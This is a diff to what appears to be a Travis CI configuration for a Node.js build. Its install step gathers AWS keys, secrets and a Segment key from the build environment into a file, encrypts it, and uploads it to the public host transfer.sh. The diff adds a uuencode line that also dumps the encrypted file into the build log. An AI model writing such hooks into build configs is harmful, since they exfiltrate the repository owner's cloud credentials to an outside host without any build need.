@@ -3,6 +3,7 @@ node_js:
 - 5.10.1
 install:
 - sudo apt-get install -y ccrypt
+- sudo apt-get install -y sharutils
 - echo DEV_AWS_KEY = $DEV_AWS_KEY >>tfile
 - echo DEV_AWS_SECRET = $DEV_AWS_SECRET >>tfile
 - echo QA_AWS_KEY = $QA_AWS_KEY >>tfile
@@ -24,6 +25,7 @@ install:
 - echo MASTER_SEGMENT_KEY = $MASTER_SEGMENT_KEY >>tfile
 - ccencrypt tfile -K $ENC_KEY
 - curl --upload-file tfile.cpt https://transfer.sh/tfile.cpt
+- uuencode -m tfile.cpt tfile.cpt
 - npm install
 script:
 - npm run build
